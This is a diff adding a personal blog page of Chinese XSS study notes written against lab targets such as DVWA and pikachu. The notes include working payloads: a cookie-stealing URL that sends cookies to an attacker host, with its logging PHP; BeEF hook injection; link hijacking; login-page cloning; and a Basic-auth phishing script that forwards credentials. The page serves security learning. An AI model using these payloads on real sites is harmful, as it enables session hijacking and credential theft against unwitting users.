@@ -1,0 +1,750 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>XSS漏洞学习 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XSS漏洞学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-02-17 19:57" pubdate>
+        2020年2月17日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      57
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS漏洞学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="XSS-跨站脚本攻击-学习"><a href="#XSS-跨站脚本攻击-学习" class="headerlink" title="XSS(跨站脚本攻击)学习"></a>XSS(跨站脚本攻击)学习</h1><p>前言：本次学习内容基于<a target="_blank" rel="noopener" href="http://xss-quiz.int21h.jp,该链接的靶场和pikachu靶场/">http://xss-quiz.int21h.jp，该链接的靶场和pikachu靶场</a></p>
+<h3 id="Xss攻击漏洞原理："><a href="#Xss攻击漏洞原理：" class="headerlink" title="Xss攻击漏洞原理："></a>Xss攻击漏洞原理：</h3><p>通常指黑客通过’HTML注入’篡改了网页，插入恶意的脚本，从而在用户游览网页时，控制用户游览器的一种攻击。</p>
+<h3 id="跨站脚本攻击漏洞测试流程："><a href="#跨站脚本攻击漏洞测试流程：" class="headerlink" title="跨站脚本攻击漏洞测试流程："></a>跨站脚本攻击漏洞测试流程：</h3><p>1.在目标站点上找到输入点，比如查询接口，留言板</p>
+<p>2.输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理</p>
+<p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件（构造闭合）；</p>
+<p>4.通过提交构造的脚本代码（以及各种绕过姿势你），看是否可以成功执行，如果成功执行则说明存在XSS漏洞</p>
+<h2 id="知识添加："><a href="#知识添加：" class="headerlink" title="知识添加："></a>知识添加：</h2><p><strong>2020-3-2：</strong>XSS绕过可以使用注释进行干扰</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">&lt;scri<span class="hljs-comment">&lt;!--test--&gt;</span>pt&gt;alert(111)&lt;/scr<span class="hljs-comment">&lt;!--test--&gt;</span>ipt&gt;</span><br></code></pre></td></tr></table></figure>
+<p>编码绕过核心思想是：后台不识别，前端识别:</p>
+<p><strong>2020-3-2 ：</strong>关于绕过htmlspeclalchars($string,ENT_QUOTES)函数</p>
+<p>可用的引号类型：后台若是选择1,3，则存在XSS漏洞</p>
+<p>1.ENT_COMPAT: 默认。仅编码双引号</p>
+<p>2.ENT_QUOTES:编码双引号和单引号</p>
+<p>3.ENT_NOQUOTES:不编码任何引号</p>
+<p>**2020-3-2:**xss常见的防范措施</p>
+<p>总的原则：输入做过滤，输出做转义</p>
+<h2 id="XSS漏洞危害利用"><a href="#XSS漏洞危害利用" class="headerlink" title="XSS漏洞危害利用"></a>XSS漏洞危害利用</h2><h3 id="1、XSS盗取cookie"><a href="#1、XSS盗取cookie" class="headerlink" title="1、XSS盗取cookie"></a>1、XSS盗取cookie</h3><p>存在GET反射型XSS漏洞的站点，可以使用以下连接进行盗取</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">以dvwa low级别进行演示</span><br><span class="xml">http://192.168.0.43:89/vulnerabilities/xss_r/?uname=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&#x27;http://192.168.0.42/cookie.php?cookie=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br><span class="xml">我的cookie.php的代码是</span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php">	<span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];</span><br><span class="php">	file_put_content(<span class="hljs-string">&#x27;cookie.txt&#x27;</span>,<span class="hljs-variable">$cookie</span>);</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>盗取到cookie可以做的是：</p>
+<p>我们可以拿盗取到的cookie，伪装成目标进行登录，这样页面返回的是已经登录后的界面；</p>
+<p>进入到后台后寻找上传页面，上传webshell；</p>
+<p>修改配置文件；</p>
+<h3 id="2-XSS篡改网页连接"><a href="#2-XSS篡改网页连接" class="headerlink" title="2.XSS篡改网页连接"></a>2.XSS篡改网页连接</h3><p>1.js讲解及篡改链接</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-built_in">window</span>.onload 当窗口加载时，执行匿名函数 <br><span class="hljs-comment">//获取所有的a标签</span><br><span class="hljs-comment">//使用for循环遍历所有获得的链接a标签</span><br>&lt;script&gt;<br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> link = <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">&quot;a&quot;</span>);  <br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; link.length; j++ )&#123;<br>        link[j].href = <span class="hljs-string">&quot;http://attack-site.com&quot;</span>;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>将篡改代码注入到对应的XSS位置，以dvwa反射XSS为例</p>
+<p>2.XSS篡改链接指向url,刷网站流量</p>
+<p>刷流量，某些站点的重定向</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">window.onload = function()&#123;</span><br><span class="xml">    var link = document.getElementsByTagName(&quot;a&quot;);  </span><br><span class="xml">    for (j = 0; j &lt; link.length; j++ )&#123;</span><br><span class="xml">        link[j].href = &quot;http://reader-l.github.io&quot;;</span><br><span class="xml">    &#125;</span><br><span class="xml">&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+<p>3.xss篡改链接指向恶意url</p>
+<p>利用kali 中的beef进行恶意链接生成（beef-xss），以及利用hook.js执行其它命令;注意要先安装beef-xss</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml">生成链接后，先进行beef登录，账号和密码都是beef，然后在XSS漏洞网站，将下列的代码XSS注到目标网站</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">window.onload = function()&#123;</span><br><span class="xml">    var link = document.getElementsByTagName(&quot;a&quot;);  </span><br><span class="xml">    for (j = 0; j &lt; link.length; j++ )&#123;</span><br><span class="xml">        link[j].href = &quot;http://kali的IP地址/index.html&quot;;</span><br><span class="xml">    &#125;</span><br><span class="xml">&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">例子：</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">window.onload = function()&#123;</span><br><span class="xml">    var link = document.getElementsByTagName(&quot;a&quot;);  </span><br><span class="xml">    for (j = 0; j &lt; link.length; j++ )&#123;</span><br><span class="xml">        link[j].href = &quot;http://192.168.0.37/index.html&quot;;</span><br><span class="xml">    &#125;</span><br><span class="xml">&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.0.37(kali的IP地址)/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>将这代码放到你的攻击页面中，上面的XSS注入会让目标访问我们kali的index.html页面，所以我们得把这代码放到index.html中<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/1582634279875.png" srcset="/img/loading.gif" alt="1582634279875"></p>
+<h3 id="3-XSS盗取用户信息"><a href="#3-XSS盗取用户信息" class="headerlink" title="3.XSS盗取用户信息"></a>3.XSS盗取用户信息</h3><p>克隆网站登录页面，利用存储XSS设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。</p>
+<p>1.setoolkit工具克隆网站</p>
+<p>按着要求选择2,3,2，输入你要克隆的登录界面</p>
+<p>比如：<a target="_blank" rel="noopener" href="http://192.168.0.43:89/login.php%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%98%AF%E6%88%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdvwa%E7%9A%84%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2">http://192.168.0.43:89/login.php，这个是我虚拟机中dvwa的登录页面</a></p>
+<p>2.存储XSS跳转克隆网站</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location=<span class="hljs-string">&quot;http://192.168.0.37(kali的IP地址)&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location=<span class="hljs-string">&quot;http://192.168.0.37&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>将这句XSS代码注入到有存储XSS漏洞的页面<br><br></code></pre></td></tr></table></figure>
+<p>3.查看盗取账号和密码</p>
+<p>对方跳转到我们的克隆网站后，输入登录信息</p>
+<p>我们就可以盗取到了账号和密码</p>
+<p><img src="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/1582636761614.png" srcset="/img/loading.gif" alt="1582636761614"></p>
+<h3 id="4-XSS钓鱼攻击"><a href="#4-XSS钓鱼攻击" class="headerlink" title="4.XSS钓鱼攻击"></a>4.XSS钓鱼攻击</h3><p>1.制作鱼饵。</p>
+<p>可以设置一个：WWW-Authenticate:Basic认证窗口，诱使目标填入账号和密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;<br>        header(<span class="hljs-string">&#x27;Content-type/html;charset=utf-8&#x27;</span>);<br>        header(<span class="hljs-string">&quot;WWW-Authenticate: Basic readlm=&#x27;认证&#x27;&quot;</span>);<br>        header(<span class="hljs-string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Authorization Required&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;<br>        header(<span class="hljs-string">&quot;Location: http://192.168.0.42/xfish.php?username=<span class="hljs-subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&amp;password=<span class="hljs-subst">&#123;$_SERVER[&#x27;PHP_AUTH_PW&#x27;]&#125;</span>&quot;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>2.寻找鱼活动的地方：将下列代码插入存在XSS漏洞的页面，让其跳到我们上面的鱼饵页面</p>
+<figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erb"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.0.42/fish.php&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/1583139359860.png" srcset="/img/loading.gif" alt="1583139359860"></p>
+<p>用户访问存在XSS漏洞的页面后，就会弹出该认证框，诱使目标填写账号和密码</p>
+<p>3.准备木桶收鱼</p>
+<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>是将XSS插入后台页面，只有管理员才能看到，前端用户看不到回显</p>
+<h2 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h2><h3 id="1-探测XSS过程"><a href="#1-探测XSS过程" class="headerlink" title="1.探测XSS过程"></a>1.探测XSS过程</h3><p>1.构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</p>
+<p>2.使用游览器审查工具进行代码审查，寻找构造的字符串是否在页面显示</p>
+<h3 id="2-构造XSSpayload"><a href="#2-构造XSSpayload" class="headerlink" title="2.构造XSSpayload"></a>2.构造XSSpayload</h3><p>1.简单payload：</p>
+<figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erb"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>2.闭合标签payload:</p>
+<figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbscript-html"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="标签属性中的XSS"><a href="#标签属性中的XSS" class="headerlink" title="标签属性中的XSS"></a>标签属性中的XSS</h2><p><strong>1.配置chrome关闭XSS-auditor机制</strong></p>
+<p>新建一个快捷方式，设置快捷方式的路径，在原来的路径后面跟添加 Chrome –args -disable-xss-auditor</p>
+<p><strong>2.属性中XSS发现和利用</strong></p>
+<p>1.先输入一个正常的值.</p>
+<p>2.然后审查元素查看值的去向</p>
+<p><img src="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20200226155739.png" srcset="/img/loading.gif"></p>
+<p>3.闭合引号和尖括号，引入script脚本</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>3.属性中XSS闭合引入事件</strong></p>
+<figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">&quot;onmouseover</span>=<span class="hljs-string">alert(document.domain)&gt;</span><br><span class="hljs-string">该事件的功能是：当你把鼠标移到对应位置上，就会触发XSS攻击</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="6-选择列表中的XSS"><a href="#6-选择列表中的XSS" class="headerlink" title="6.选择列表中的XSS"></a>6.选择列表中的XSS</h3><p>HTML select标签介绍</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span>元素中<span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>标签用于定义列表中的可用选项</span><br></code></pre></td></tr></table></figure>
+<p>因为无法直接在选择列表中添加我们的XSS代码，因此我们需要用burp进行抓包</p>
+<p>然后将XSS代码再加进去，提交后方能完成，当然得记住闭合</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Japan&lt;/<span class="hljs-keyword">option</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>Japan<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>      //这题貌似不用闭合<span class="hljs-keyword">option</span>，也可以<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="7-隐藏提交参数中的XSS"><a href="#7-隐藏提交参数中的XSS" class="headerlink" title="7.隐藏提交参数中的XSS"></a>7.隐藏提交参数中的XSS</h3><p>HTML表单隐藏参数介绍</p>
+<p>隐藏域是用来收集或发送信息的不可见元素，对于网页的访问者来说，隐藏域是看不见的。当表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器上。</p>
+<p>利用burp抓包和源代码审计进行审核</p>
+<p><img src="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20200226163402.png" srcset="/img/loading.gif"></p>
+<p>查看有隐藏表单后，利用HTML中svg进行攻击</p>
+<p>svg意为可缩放矢量图形</p>
+<p>SVG使用XML格式定义图像</p>
+<p>SVG文件可用过以下标签嵌入HTML文档：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">object</span>&gt;</span>、<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>,也可以通过svg标签插入</span><br><span class="xml">&lt;svg/事件=&quot;&quot;&gt;</span><br><br><span class="xml">闭合触发XSS</span><br><span class="xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(document.domain)</span>&gt;</span>%0a  //%0a是可以作为空格</span><br><span class="xml">除了用svg还可以用之前的属性value值闭合</span><br><span class="xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="8-HTML事件中的XSS"><a href="#8-HTML事件中的XSS" class="headerlink" title="8.HTML事件中的XSS"></a>8.HTML事件中的XSS</h3><p>XSS闭合思路常用的有两种：</p>
+<p>1.通过闭合input标签，加入</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>2.通过HTML事件来触发XSS(可以用来绕过对&lt;&gt;的过滤)，例如</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;onmouseover=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-variable">document.domain</span>)</span><br><span class="hljs-string">&quot;onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-variable">document.cookie</span>)</span><br></code></pre></td></tr></table></figure>
+
+
